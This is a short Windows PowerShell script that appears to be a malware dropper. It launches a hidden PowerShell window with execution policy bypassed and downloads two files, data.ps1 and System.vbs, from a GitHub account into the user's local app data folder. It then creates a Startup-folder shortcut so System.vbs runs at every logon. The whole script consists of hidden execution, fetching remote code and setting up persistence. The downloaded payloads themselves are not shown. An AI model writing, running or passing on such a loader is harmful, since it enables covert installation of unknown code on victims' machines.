cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
$LocalPath = "$env:LOCALAPPDATA"
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# File URLs
$File1Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/data.ps1"
$File2Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/System.vbs"

# File names
$File1Name = "data.ps1"
$File2Name = "System.vbs"

# Full paths to save the files
$File1Path = Join-Path -Path $LocalPath -ChildPath $File1Name
$File2Path = Join-Path -Path $LocalPath -ChildPath $File2Name

# Download data.ps1
Invoke-WebRequest -Uri $File1Url -OutFile $File1Path

# Download System.vbs
Invoke-WebRequest -Uri $File2Url -OutFile $File2Path

# Create a shortcut for System.vbs
$ShortcutPath = Join-Path -Path $StartupPath -ChildPath "System.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $File2Path
$Shortcut.Save()

Write-Output "Files have been downloaded, and the shortcut has been created."
